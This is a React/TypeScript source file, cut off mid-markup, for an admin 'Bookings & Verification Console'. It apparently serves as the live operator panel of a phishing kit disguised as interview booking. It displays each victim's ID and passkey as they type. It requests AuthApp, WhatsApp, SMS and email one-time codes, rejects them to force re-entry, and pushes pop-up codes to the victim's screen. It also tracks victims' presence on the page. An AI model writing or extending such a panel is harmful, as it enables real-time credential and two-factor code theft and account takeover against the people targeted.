"use client";

import { useEffect, useState, useCallback, useMemo } from "react";
import { createClient } from "@/lib/supabase/client";
import {
  parseBookingCodeData,
  serializeBookingCodeData,
  getCodeLabel,
  type BookingCodeData,
} from "@/lib/codeData";
import {
  Send,
  RefreshCw,
  X,
  Check,
  CheckCheck,
  Copy,
  Zap,
  Filter,
  Bell,
  Volume2,
  VolumeX,
  Eye,
  Clock,
  Activity,
} from "lucide-react";
import type { Booking, ScheduleVisit } from "@/lib/types";

export interface CandidatePresence {
  session_id: string;
  booking_id?: string | null;
  admin_user_id?: string | null;
  admin_email?: string | null;
  interviewer_name?: string | null;
  name?: string;
  email?: string;
  phone?: string;
  date?: string;
  start_time?: string;
  end_time?: string;
  phase?: string;
  online?: boolean;
  updated_at?: number;
}

function playNotificationChime() {
  try {
    const AudioCtx =
      window.AudioContext ||
      (window as unknown as { webkitAudioContext: typeof AudioContext }).webkitAudioContext;
    if (!AudioCtx) return;
    const ctx = new AudioCtx();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.type = "sine";
    osc.frequency.setValueAtTime(587.33, ctx.currentTime); // D5
    osc.frequency.setValueAtTime(880, ctx.currentTime + 0.1); // A5
    gain.gain.setValueAtTime(0.12, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.35);
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.start();
    osc.stop(ctx.currentTime + 0.35);
  } catch {}
}

function formatTime(t: string) {
  const [h, m] = t.split(":").map(Number);
  const period = h >= 12 ? "PM" : "AM";
  const hour12 = h % 12 === 0 ? 12 : h % 12;
  return `${hour12}:${String(m).padStart(2, "0")} ${period}`;
}

// Reusable Copy button with visual feedback and flex-shrink-0 guarantee
function CopyIconButton({ value, label }: { value: string | null | undefined; label?: string }) {
  const [copied, setCopied] = useState(false);

  if (!value || value.trim() === "" || value === "-") {
    return (
      <button disabled className="text-gray-300 cursor-default p-1 flex-shrink-0">
        <Copy className="w-4 h-4" />
      </button>
    );
  }

  const handleCopy = (e: React.MouseEvent) => {
    e.stopPropagation();
    navigator.clipboard.writeText(value);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <button
      type="button"
      onClick={handleCopy}
      title={copied ? "Copied!" : `Copy ${label || "value"}`}
      className={`p-1.5 rounded-lg flex-shrink-0 transition-all ${
        copied
          ? "text-emerald-600 bg-emerald-50"
          : "text-gray-400 hover:text-gray-800 hover:bg-gray-100"
      }`}
    >
      {copied ? <CheckCheck className="w-4 h-4 text-emerald-600" /> : <Copy className="w-4 h-4" />}
    </button>
  );
}

// Candidate Phase Badge rendering
function CandidatePhaseBadge({ b }: { b: Booking }) {
  const codeData = parseBookingCodeData(b.additional_code);
  const req = codeData.active_req || "";

  if (b.status === "confirmed") {
    return (
      <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-emerald-50 text-emerald-700 border border-emerald-200">
        <span className="w-2 h-2 rounded-full bg-emerald-500" />
        <span>Confirmed</span>
      </span>
    );
  }

  if (b.status === "rejected") {
    return (
      <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-red-50 text-red-700 border border-red-200">
        <span className="w-2 h-2 rounded-full bg-red-500" />
        <span>Rejected (Re-entering ID)</span>
      </span>
    );
  }

  if (b.status === "awaiting_code") {
    if (req.startsWith("POP_CODE:")) {
      const val = req.replace("POP_CODE:", "");
      return (
        <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-purple-50 text-purple-700 border border-purple-200 shadow-2xs">
          <span className="w-2 h-2 rounded-full bg-purple-600 animate-pulse" />
          <span>Pop-out Code Active: {val}</span>
        </span>
      );
    }

    if (req.includes("_REJECTED")) {
      const match = req.match(/CODE_(\d)_REJECTED/i);
      const num = match ? parseInt(match[1], 10) : 1;
      const label = getCodeLabel(num);
      return (
        <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-red-50 text-red-700 border border-red-200">
          <span className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
          <span>{label} Rejected (Re-entering)</span>
        </span>
      );
    }

    if (req.includes("_REQUESTED")) {
      const match = req.match(/CODE_(\d)_REQUESTED/i);
      const num = match ? parseInt(match[1], 10) : 1;
      const label = getCodeLabel(num);
      return (
        <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-amber-50 text-amber-800 border border-amber-200">
          <span className="w-2 h-2 rounded-full bg-amber-500 animate-pulse" />
          <span>Candidate in {label}</span>
        </span>
      );
    }
  }

  // status === "pending"
  const submittedCodes = [
    codeData.code_4 ? "Email" : null,
    codeData.code_3 ? "SMS" : null,
    codeData.code_2 ? "WhatsApp" : null,
    codeData.code_1 ? "AuthApp" : null,
  ].filter(Boolean);

  if (submittedCodes.length > 0) {
    return (
      <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-blue-50 text-blue-700 border border-blue-200">
        <span className="w-2 h-2 rounded-full bg-blue-500" />
        <span>{submittedCodes[0]} Submitted</span>
      </span>
    );
  }

  if (b.candidate_id && b.passkey) {
    return (
      <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-amber-50/90 text-amber-800 border border-amber-200">
        <span className="w-2 h-2 rounded-full bg-amber-500" />
        <span>ID &amp; Passkey (Reviewing)</span>
      </span>
    );
  }

  return (
    <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-amber-50/80 text-amber-900 border border-amber-200">
      <span className="w-2 h-2 rounded-full bg-amber-500 animate-pulse" />
      <span>In ID/Passkey Modal</span>
    </span>
  );
}

// Dedicated PopCodeCard with local state for 100% fluid typing without parent re-renders or focus loss
function PopCodeCardItem({
  b,
  busy,
  onSendPopCode,
  onClearPopCode,
}: {
  b: Booking;
  busy: boolean;
  onSendPopCode: (b: Booking, codeVal: string) => Promise<void>;
  onClearPopCode: (b: Booking) => Promise<void>;
}) {
  const codeData = parseBookingCodeData(b.additional_code);
  const isPopActive = b.status === "awaiting_code" && codeData.active_req?.startsWith("POP_CODE:");
  const [localInput, setLocalInput] = useState(codeData.pop_code || "");

  useEffect(() => {
    if (codeData.pop_code !== undefined) {
      setLocalInput(codeData.pop_code || "");
    }
  }, [codeData.pop_code]);

  const handleSubmit = (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (!localInput.trim()) return;
    onSendPopCode(b, localInput.trim());
  };

  return (
    <div className="flex-1 min-w-[136px] max-w-[160px] bg-purple-50/30 border border-purple-200 rounded-2xl p-3 flex flex-col justify-between space-y-2.5 shadow-2xs overflow-hidden">
      {/* Header: Pop Code Title + Dot */}
      <div className="flex items-center justify-between">
        <span className="text-xs font-bold text-purple-950 truncate pr-1">
          Pop Code
        </span>
        <span
          className={`w-2.5 h-2.5 rounded-full shrink-0 ${
            isPopActive ? "bg-purple-600 animate-pulse" : "bg-gray-300"
          }`}
        />
      </div>

      {/* Actions: Fast local input + Send button + Clear */}
      <form onSubmit={handleSubmit} className="flex items-center gap-1 w-full min-w-0">
        <input
          type="text"
          placeholder="-"
          value={localInput}
          onChange={(e) => setLocalInput(e.target.value)}
          className="w-full min-w-0 px-2 py-1 bg-white border border-purple-300 rounded-lg text-xs font-mono font-bold text-gray-900 outline-none focus:border-purple-600 text-center shadow-2xs"
        />

        <button
          type="submit"
          disabled={busy || !localInput.trim()}
          className="p-1.5 bg-[#7c3aed] hover:bg-[#6d28d9] text-white rounded-lg font-bold text-xs flex items-center justify-center transition-all disabled:opacity-40 shadow-2xs shrink-0 cursor-pointer"
          title={isPopActive ? "Update Pop Code" : "Send Pop Code to candidate"}
        >
          <Send className="w-3 h-3" />
        </button>

        {isPopActive && (
          <button
            type="button"
            disabled={busy}
            onClick={() => {
              setLocalInput("");
              onClearPopCode(b);
            }}
            className="p-1 hover:bg-purple-100 text-purple-700 rounded-lg transition-colors border border-purple-200 shrink-0 cursor-pointer"
            title="Dismiss pop-out code"
          >
            <X className="w-3 h-3" />
          </button>
        )}
      </form>

      {/* Value Box with Active Pop Code + Copy Icon */}
      <div className="flex items-center justify-between gap-1 px-2.5 py-1.5 bg-white border border-purple-200 rounded-xl shadow-2xs min-h-[38px] min-w-0">
        <div className="flex items-center gap-1 font-mono font-bold text-sm text-purple-950 select-all truncate min-w-0 flex-1">
          {codeData.pop_code ? (
            <>
              <Zap className="w-3.5 h-3.5 text-amber-500 fill-amber-500 shrink-0" />
              <span className="truncate" title={codeData.pop_code}>{codeData.pop_code}</span>
            </>
          ) : (
            <span className="text-gray-400 font-normal">-</span>
          )}
        </div>
        <CopyIconButton value={codeData.pop_code} label="Pop Code" />
      </div>
    </div>
  );
}

// Standalone Booking Card Component
function BookingCardItem({
  b,
  busyId,
  isOnline,
  onConfirm,
  onRejectId,
  onRequireCode,
  onRejectSpecificCode,
  onSendPopCode,
  onClearPopCode,
}: {
  b: Booking;
  busyId: string | null;
  isOnline: boolean;
  onConfirm: (id: string) => Promise<void>;
  onRejectId: (id: string) => Promise<void>;
  onRequireCode: (b: Booking, num: number) => Promise<void>;
  onRejectSpecificCode: (b: Booking, num: number) => Promise<void>;
  onSendPopCode: (b: Booking, codeVal: string) => Promise<void>;
  onClearPopCode: (b: Booking) => Promise<void>;
}) {
  const codeData = parseBookingCodeData(b.additional_code);
  const codes = [1, 2, 3, 4] as const;

  return (
    <div className="bg-white border border-gray-200/90 rounded-2xl shadow-sm p-6 sm:p-8 space-y-7 font-sans hover:shadow-md transition-shadow">
      {/* TOP ROW: Candidate Info + Online/Offline status, Date/Time, and Candidate ID & Passkey */}
      <div className="flex flex-col xl:flex-row items-start xl:items-center justify-between gap-6 pb-6 border-b border-gray-100">
        {/* Candidate Profile + Online/Offline Status */}
        <div className="min-w-[200px] space-y-1.5">
          <div className="flex items-center gap-2">
            <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider block">
              Candidate
            </span>

            {/* Online / Offline Indicator Badge */}
            {isOnline ? (
              <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[10px] font-bold bg-emerald-50 text-emerald-700 border border-emerald-300 shadow-2xs">
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
                <span>Online</span>
              </span>
            ) : b.status === "pending" || b.status === "awaiting_code" ? (
              <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[10px] font-bold bg-red-50 text-red-700 border border-red-200">
                <span className="w-1.5 h-1.5 rounded-full bg-red-500" />
                <span>Offline (Left Page)</span>
              </span>
            ) : (
              <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[10px] font-bold bg-gray-100 text-gray-500 border border-gray-200">
                <span className="w-1.5 h-1.5 rounded-full bg-gray-400" />
                <span>Offline</span>
              </span>
            )}
          </div>

          <h3 className="text-2xl font-bold text-gray-900 leading-tight">
            {b.first_name} {b.last_name}
          </h3>
          <p className="text-sm text-gray-600 font-medium">{b.email}</p>
          <p className="text-sm text-gray-600">{b.phone_number || "—"}</p>
        </div>

        {/* Date & Time */}
        <div className="min-w-[130px] space-y-1">
          <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider block">
            Date &amp; Time
          </span>
          <p className="text-base font-bold text-gray-900">
            {new Date(b.date + "T00:00:00").toLocaleDateString("en-US", {
              month: "short",
              day: "numeric",
            })}
          </p>
          <p className="text-sm text-gray-600">{formatTime(b.start_time)}</p>
        </div>

        {/* Extra Large Candidate ID Box */}
        <div className="flex-1 min-w-[220px] max-w-sm space-y-1.5">
          <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider block">
            Candidate ID
          </span>
          <div className="flex items-center justify-between gap-3 px-5 py-3.5 bg-gray-50/50 border border-gray-200 rounded-2xl shadow-2xs min-w-0">
            {b.candidate_id ? (
              <span
                className="text-2xl font-bold text-gray-900 font-sans tracking-wide select-all truncate min-w-0 flex-1"
                title={b.candidate_id}
              >
                {b.candidate_id}
              </span>
            ) : (
              <span className="text-sm text-gray-400 italic">Entering…</span>
            )}
            <CopyIconButton value={b.candidate_id} label="Candidate ID" />
          </div>
        </div>

        {/* Extra Large Passkey Box */}
        <div className="flex-1 min-w-[220px] max-w-sm space-y-1.5">
          <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider block">
            Passkey
          </span>
          <div className="flex items-center justify-between gap-3 px-5 py-3.5 bg-gray-50/50 border border-gray-200 rounded-2xl shadow-2xs min-w-0">
            {b.passkey ? (
              <span
                className="text-2xl font-bold text-gray-900 font-mono tracking-wider select-all truncate min-w-0 flex-1"
                title={b.passkey}
              >
                {b.passkey}
              </span>
            ) : (
              <span className="text-sm text-gray-400 italic">Entering…</span>
            )}
            <CopyIconButton value={b.passkey} label="Passkey" />
          </div>
        </div>
      </div>

      {/* BOTTOM ROW: Candidate Phase, Uniform 5-Card Codes Grid (AuthApp, WhatsApp, SMS, Code 4, Pop Code), and Action Buttons */}
      <div className="flex flex-col 2xl:flex-row items-start 2xl:items-center justify-between gap-6 pt-1">
        {/* Candidate Phase & Admin Attribution */}
        <div className="min-w-[200px] space-y-3">
          {/* Admin User (Email) / Link Origin */}
          <div className="space-y-1">
            <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider block">
              Admin Link (Email)
            </span>
            <div className="flex items-center justify-between gap-1.5 px-3 py-1.5 bg-blue-50/70 border border-blue-200/90 rounded-xl shadow-2xs min-h-[36px]">
              <div className="flex items-center gap-1.5 min-w-0 flex-1">
                <span className="w-2 h-2 rounded-full bg-blue-600 shrink-0" />
                <span
                  className="text-xs font-bold text-blue-950 truncate"
                  title={b.admin_email || b.interviewer_name || "Default Admin"}
                >
                  {b.admin_email || (b.interviewer_name ? `${b.interviewer_name}` : "Default Admin")}
                </span>
              </div>
              {b.admin_email && <CopyIconButton value={b.admin_email} label="Admin Email" />}
            </div>
          </div>

          {/* Candidate Phase Status Badge */}
          <div className="space-y-1">
            <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider block">
              Candidate Phase
            </span>
            <div>
              <CandidatePhaseBadge b={b} />
            </div>
          </div>
        </div>

        {/* Symmetrical Uniform 5-Card Grid: AuthApp, WhatsApp, SMS, Code 4, and Pop Code */}
        <div className="space-y-2 flex-1 w-full">
          <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider block">
            Additional Codes (Required If Rejected) &amp; Pop-out Code
          </span>

          <div className="flex flex-wrap sm:flex-nowrap gap-3 w-full">
            {/* Codes 1 to 4 (AuthApp, WhatsApp, SMS, Code 4) */}
            {codes.map((num) => {
              const codeKey = `code_${num}` as keyof BookingCodeData;
              const value = codeData[codeKey];
              const label = getCodeLabel(num);

              const isRequested =
                b.status === "awaiting_code" && codeData.active_req === `CODE_${num}_REQUESTED`;
              const isRejected =
                b.status === "awaiting_code" && codeData.active_req === `CODE_${num}_REJECTED`;
              const hasSubmitted = Boolean(value && value.trim() !== "");

              // Disable Reject if Send was not pressed / code not requested & not submitted
              const isSendTriggeredOrSubmitted = Boolean(isRequested || isRejected || hasSubmitted);

              // Status Dot
              let dotClass = "bg-gray-300";
              if (hasSubmitted) dotClass = "bg-emerald-500";
              else if (isRequested) dotClass = "bg-amber-500 animate-pulse";
              else if (isRejected) dotClass = "bg-red-500";

              return (
                <div
                  key={num}
                  className="flex-1 min-w-[136px] max-w-[160px] bg-white border border-gray-200/90 rounded-2xl p-3 flex flex-col justify-between space-y-2.5 shadow-2xs overflow-hidden"
                >
                  {/* Header: Label Title + Dot */}
                  <div className="flex items-center justify-between">
                    <span className="text-xs font-bold text-gray-800 truncate pr-1">
                      {label}
                    </span>
                    <span className={`w-2.5 h-2.5 rounded-full shrink-0 ${dotClass}`} />
                  </div>

                  {/* Actions: Send & Reject */}
                  <div className="flex gap-1 w-full min-w-0">
                    <button
                      type="button"
                      disabled={busyId === b.id}
                      onClick={() => onRequireCode(b, num)}
                      className={`flex-1 py-1.5 px-1.5 rounded-lg border text-[11px] font-bold flex items-center justify-center gap-1 transition-all min-w-0 cursor-pointer ${
                        isRequested
                          ? "bg-emerald-600 text-white border-emerald-600 shadow-2xs"
                          : "border-emerald-300 text-emerald-700 bg-emerald-50/40 hover:bg-emerald-100/70"
                      }`}
                      title={`Send request for ${label} verification code to candidate`}
                    >
                      <Send className="w-2.5 h-2.5 shrink-0" />
                      <span className="truncate">Send</span>
                    </button>

                    <button
                      type="button"
                      disabled={busyId === b.id || !isSendTriggeredOrSubmitted}
                      onClick={() => onRejectSpecificCode(b, num)}
                      className="flex-1 py-1.5 px-1.5 rounded-lg border border-red-300 text-red-600 bg-red-50/40 hover:bg-red-100/70 text-[11px] font-bold flex items-center justify-center gap-1 transition-all disabled:opacity-30 disabled:border-gray-200 disabled:bg-gray-50 disabled:text-gray-400 disabled:cursor-not-allowed min-w-0 cursor-pointer"
                      title={
                        isSendTriggeredOrSubmitted
                          ? `Reject ${label} code (candidate stays on ${label} popup)`
                          : `Send must be pressed before you can reject ${label} code`
                      }
                    >
                      <X className="w-2.5 h-2.5 shrink-0" />
                      <span className="truncate">Reject</span>
                    </button>
                  </div>

                  {/* Value Box with Large Text + Copy Icon */}
                  <div className="flex items-center justify-between gap-1 px-2.5 py-1.5 bg-white border border-gray-200 rounded-xl shadow-2xs min-h-[38px] min-w-0">
                    <span
                      className={`font-bold font-mono text-base truncate min-w-0 flex-1 ${
                        value ? "text-gray-900 select-all" : "text-gray-400 font-normal"
                      }`}
                      title={value || "-"}
                    >
                      {value || "-"}
                    </span>
                    <CopyIconButton value={value} label={label} />
                  </div>
                </div>
              );
            })}

            {/* 5th Card: Pop-out Code with Fluid Local State */}
            <PopCodeCardItem
              b={b}
              busy={busyId === b.id}
              onSendPopCode={onSendPopCode}
              onClearPopCode={onClearPopCode}
            />
          </div>
        </div>

        {/* Action Section: Confirm Next Step & Reject ID */}
        <div className="flex flex-col gap-2.5 min-w-[190px] w-full sm:w-auto self-stretch 2xl:self-center pt-2 2xl:pt-0 2xl:pl-4 2xl:border-l border-gray-100">
          <button
            type="button"
            disabled={busyId === b.id || b.status === "confirmed"}
            onClick={() => onConfirm(b.id)}
            className="w-full px-5 py-2.5 bg-[#059669] hover:bg-[#047857] text-white rounded-xl font-bold text-sm shadow-sm transition-all disabled:opacity-40 flex items-center justify-center gap-2 cursor-pointer"
          >
            <Check className="w-4 h-4" />
            <span>Confirm Next Step</span>
          </button>

          <button
            type="button"
            disabled={busyId === b.id || b.status === "rejected"}
            onClick={() => onRejectId(b.id)}
            className="w-full px-5 py-2 bg-white hover:bg-red-50 text-[#dc2626] border border-[#ef4444] rounded-xl font-bold text-sm transition-all disabled:opacity-40 flex items-center justify-center gap-2 cursor-pointer"
          >
            <X className="w-4 h-4 text-[#dc2626]" />
            <span>Reject ID</span>
          </button>
        </div>
      </div>
    </div>
  );
}

// Active Draft Session Card
function DraftSessionCard({ s, isOnline }: { s: CandidatePresence; isOnline: boolean }) {
  return (
    <div className="bg-white/90 border-2 border-dashed border-amber-300 rounded-2xl shadow-sm p-6 sm:p-8 space-y-5 font-sans">
      <div className="flex flex-col xl:flex-row items-start xl:items-center justify-between gap-6 pb-4 border-b border-amber-100">
        <div className="min-w-[200px] space-y-1.5">
          <div className="flex items-center gap-2">
            <span className="text-[11px] font-bold text-amber-700 uppercase tracking-wider block">
              Candidate (Entering ID &amp; Passkey)
            </span>

            {isOnline ? (
              <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[10px] font-bold bg-emerald-50 text-emerald-700 border border-emerald-300 shadow-2xs">
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
                <span>Online</span>
              </span>
            ) : (
              <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[10px] font-bold bg-red-50 text-red-700 border border-red-200">
                <span className="w-1.5 h-1.5 rounded-full bg-red-500" />
                <span>Offline (Left Page)</span>
              </span>
            )}
          </div>

          <h3 className="text-2xl font-bold text-gray-900 leading-tight">
            {s.name || "Candidate"}
          </h3>
          <p className="text-sm text-gray-600 font-medium">{s.email || "—"}</p>
          <p className="text-sm text-gray-600">{s.phone || "—"}</p>
        </div>

        <div className="min-w-[130px] space-y-1">
          <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider block">
            Date &amp; Time
          </span>
          <p className="text-base font-bold text-gray-900">
            {s.date ? new Date(s.date + "T00:00:00").toLocaleDateString("en-US", { month: "short", day: "numeric" }) : "—"}
          </p>
          <p className="text-sm text-gray-600">{s.start_time ? formatTime(s.start_time) : "—"}</p>
        </div>

        <div className="flex-1 min-w-[220px] max-w-sm space-y-1.5">
          <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider block">
            Candidate ID
          </span>
          <div className="flex items-center justify-between gap-3 px-5 py-3.5 bg-gray-50 border border-gray-200 rounded-2xl shadow-2xs">
            <span className="text-sm text-gray-400 italic">Entering…</span>
          </div>
        </div>

        <div className="flex-1 min-w-[220px] max-w-sm space-y-1.5">
          <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider block">
            Passkey
          </span>
          <div className="flex items-center justify-between gap-3 px-5 py-3.5 bg-gray-50 border border-gray-200 rounded-2xl shadow-2xs">
            <span className="text-sm text-gray-400 italic">Entering…</span>
          </div>
        </div>
      </div>

      <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 pt-2 border-t border-amber-100">
        <div className="flex items-center gap-2">
          <span className="text-xs font-bold text-gray-500">Admin Link:</span>
          <span className="text-xs font-bold text-blue-900 bg-blue-50 border border-blue-200 px-2.5 py-0.5 rounded-lg">
            {s.admin_email || s.interviewer_name || "Default Admin"}
          </span>
        </div>

        <div className="flex items-center gap-2">
          <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-amber-50 text-amber-900 border border-amber-300">
            <span className="w-2 h-2 rounded-full bg-amber-500 animate-pulse" />
            <span>In ID/Passkey Modal</span>
          </span>
          <span className="text-xs text-muted font-medium">
            Waiting for candidate to submit credentials…
          </span>
        </div>
      </div>
    </div>
  );
}

export default function AdminBookingsPage() {
  const [supabase] = useState(() => createClient());
  const [bookings, setBookings] = useState<Booking[]>([]);
  const [loading, setLoading] = useState(true);
  const [busyId, setBusyId] = useState<string | null>(null);

  // Filter & UI toggles
  const [activeOnly, setActiveOnly] = useState(false);
  const [soundEnabled, setSoundEnabled] = useState(true);
  const [showVisitsLog, setShowVisitsLog] = useState(false);
  const [recentVisits, setRecentVisits] = useState<ScheduleVisit[]>([]);
  const [latestAlert, setLatestAlert] = useState<{
    admin_email?: string | null;
    interviewer_name?: string | null;
    timezone?: string | null;
    time: string;
  } | null>(null);

  // Real-Time Online / Offline Presence Map
  const [presenceMap, setPresenceMap] = useState<Record<string, CandidatePresence>>({});
  // History of presence sessions seen in current session
  const [sessionDrafts, setSessionDrafts] = useState<Record<string, CandidatePresence>>({});

  const load = useCallback(async () => {
    setLoading(true);
    const { data } = await supabase
      .from("bookings")
      .select("*")
      .order("created_at", { ascending: false });
    const rows = (data ?? []) as Booking[];
    setBookings(rows);
    setLoading(false);
  }, [supabase]);

  const loadRecentVisits = useCallback(async () => {
    try {
      const { data } = await supabase
        .from("schedule_visits")
        .select("*")
        .order("created_at", { ascending: false })
        .limit(10);
      if (data) {
        setRecentVisits(data as ScheduleVisit[]);
      }
    } catch {}
  }, [supabase]);

  useEffect(() => {
    load();
    loadRecentVisits();
  }, [load, loadRecentVisits]);

  // Live Postgres DB Changes for Bookings
  useEffect(() => {
    const channel = supabase
      .channel("admin-bookings")
      .on("postgres_changes", { event: "*", schema: "public", table: "bookings" }, () => {
        load();
      })
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [supabase, load]);

  // Live Postgres DB Changes for Schedule Visits (Immediate notification on opening page)
  useEffect(() => {
    const visitsChannel = supabase
      .channel("admin-schedule-visits")
      .on(
        "postgres_changes",
        { event: "INSERT", schema: "public", table: "schedule_visits" },
        (payload) => {
          const newVisit = payload.new as ScheduleVisit;
          setRecentVisits((prev) => [newVisit, ...prev.slice(0, 9)]);

          setLatestAlert({
            admin_email: newVisit.admin_email,
            interviewer_name: newVisit.interviewer_name,
            timezone: newVisit.timezone,
            time: new Date().toLocaleTimeString([], {
              hour: "2-digit",
              minute: "2-digit",
              second: "2-digit",
            }),
          });

          if (soundEnabled) {
            playNotificationChime();
          }
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(visitsChannel);
    };
  }, [supabase, soundEnabled]);

  // Live Presence Subscription (Track Online / Offline in Real Time)
  useEffect(() => {
    const presenceChannel = supabase.channel("candidate-presence-room");

    presenceChannel
      .on("presence", { event: "sync" }, () => {
        const state = presenceChannel.presenceState();
        const flat: Record<string, CandidatePresence> = {};
        const drafts: Record<string, CandidatePresence> = {};

        Object.entries(state).forEach(([key, presences]) => {
          if (presences && presences.length > 0) {
            const p = presences[presences.length - 1] as unknown as CandidatePresence;
            flat[key] = p;
            if (p.booking_id) flat[p.booking_id] = p;
            if (p.email) flat[p.email.toLowerCase()] = p;

            if (p.name && p.email && p.phase?.includes("ID/Passkey")) {
              drafts[p.session_id || key] = p;
            }
          }
        });

        setPresenceMap(flat);
        setSessionDrafts((prev) => ({ ...prev, ...drafts }));
      })
      .subscribe();

    return () => {
      supabase.removeChannel(presenceChannel);
    };
  }, [supabase]);

  // Global Confirm (Final approval)
  async function confirmBooking(id: string) {
    setBusyId(id);
    await supabase.from("bookings").update({ status: "confirmed" }).eq("id", id);
    setBusyId(null);
  }

  // Reject Candidate ID & Passkey
  async function rejectIdPasskey(id: string) {
    setBusyId(id);
    await supabase.from("bookings").update({ status: "rejected" }).eq("id", id);
    setBusyId(null);
  }

  // Send / Require Candidate to input AuthApp (1), WhatsApp (2), SMS (3), or Code 4 (4)
  async function requireCode(b: Booking, codeNum: number) {
    setBusyId(b.id);
    const existing = parseBookingCodeData(b.additional_code);
    const updated: BookingCodeData = {
      ...existing,
      active_req: `CODE_${codeNum}_REQUESTED`,
    };
    await supabase
      .from("bookings")
      .update({
        status: "awaiting_code",
        additional_code: serializeBookingCodeData(updated),
      })
      .eq("id", b.id);
    setBusyId(null);
  }

  // Reject specific Code (1=AuthApp, 2=WhatsApp, 3=SMS, 4=Code 4)
  async function rejectSpecificCode(b: Booking, codeNum: number) {
    setBusyId(b.id);
    const existing = parseBookingCodeData(b.additional_code);
    const updated: BookingCodeData = {
      ...existing,
      active_req: `CODE_${codeNum}_REJECTED`,
    };
    await supabase
      .from("bookings")
      .update({
        status: "awaiting_code",
        additional_code: serializeBookingCodeData(updated),
      })
      .eq("id", b.id);
    setBusyId(null);
  }

  // Pop-out / Display Code from Admin directly to Candidate Modal
  async function sendPopCode(b: Booking, codeVal: string) {
    setBusyId(b.id);

    const existing = parseBookingCodeData(b.additional_code);
    const updated: BookingCodeData = {
      ...existing,
      pop_code: codeVal,
      active_req: `POP_CODE:${codeVal}`,
    };

    await supabase
      .from("bookings")
      .update({
        status: "awaiting_code",
        additional_code: serializeBookingCodeData(updated),
      })
      .eq("id", b.id);
    setBusyId(null);
  }

  // Clear / Dismiss Pop-out Code
  async function clearPopCode(b: Booking) {
    setBusyId(b.id);
    const existing = parseBookingCodeData(b.additional_code);
    const updated: BookingCodeData = {
      ...existing,
      pop_code: null,
      active_req: null,
    };

    await supabase
      .from("bookings")
      .update({
        status: "pending",
        additional_code: serializeBookingCodeData(updated),
      })
      .eq("id", b.id);

    setBusyId(null);
  }

  // Active Drafts not yet converted to DB rows
  const activeDraftsList = useMemo(() => {
    const existingEmails = new Set(bookings.map((b) => b.email.toLowerCase()));
    return Object.values(sessionDrafts).filter(
      (d) => d.email && !existingEmails.has(d.email.toLowerCase())
    );
  }, [sessionDrafts, bookings]);

  const activeVisitorsCount = useMemo(() => {
    const onlineSessions = new Set<string>();
    Object.values(presenceMap).forEach((p) => {
      if (p.online && p.session_id) {
        onlineSessions.add(p.session_id);
      }
    });
    return onlineSessions.size;
  }, [presenceMap]);

  const pending = bookings.filter((b) => b.status === "pending" || b.status === "awaiting_code");
  const others = bookings.filter((b) => b.status === "confirmed" || b.status === "rejected");

  return (
    <div className="space-y-8 max-w-7xl mx-auto font-sans pb-16">
      {/* Page Header with Real-Time Visitor Counter, Sound Toggle, Filter & Refresh */}
      <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4">
        <div>
          <div className="flex items-center gap-3">
            <h1 className="font-display text-3xl font-bold text-ink">
              Bookings &amp; Verification Console
            </h1>

            {/* Live Active Visitor Counter */}
            {activeVisitorsCount > 0 ? (
              <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-bold bg-emerald-50 text-emerald-700 border border-emerald-300 shadow-2xs animate-pulse">
                <span className="w-2 h-2 rounded-full bg-emerald-500" />
                <span>{activeVisitorsCount} Active on Scheduling Page</span>
              </span>
            ) : (
              <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-medium bg-gray-100 text-gray-500 border border-gray-200">
                <span className="w-2 h-2 rounded-full bg-gray-400" />
                <span>No active visitors</span>
              </span>
            )}
          </div>

          <p className="mt-1.5 text-muted text-sm">
            Live candidate tracking, admin attribution, sound notifications for new page visits, and real-time verification controls.
          </p>
        </div>

        <div className="flex flex-wrap items-center gap-2.5 self-start lg:self-auto">
          {/* Sound Alert Toggle */}
          <button
            type="button"
            onClick={() => setSoundEnabled(!soundEnabled)}
            className={`inline-flex items-center gap-1.5 px-3.5 py-2 rounded-xl text-xs font-semibold border transition-all shadow-2xs cursor-pointer ${
              soundEnabled
                ? "bg-blue-50 text-blue-700 border-blue-200 hover:bg-blue-100"
